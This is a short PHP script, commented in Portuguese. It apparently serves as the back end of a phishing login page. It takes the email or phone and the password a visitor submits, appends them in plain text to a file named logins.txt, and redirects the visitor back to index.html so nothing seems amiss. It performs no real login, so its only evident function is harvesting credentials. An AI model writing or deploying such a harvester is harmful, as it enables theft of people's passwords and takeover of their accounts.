<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obter os dados do formulário
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Criar ou abrir o arquivo 'logins.txt' no modo de escrita (append)
    $file = fopen("logins.txt", "a");

    // Montar a string que será gravada
    $data = "Email/Phone: " . $email . " | Password: " . $password . "\n";

    // Escrever os dados no arquivo
    fwrite($file, $data);

    // Fechar o arquivo
    fclose($file);

    // Redirecionar de volta para a página de login após salvar
    header("Location: index.html");
    exit();
}
?>
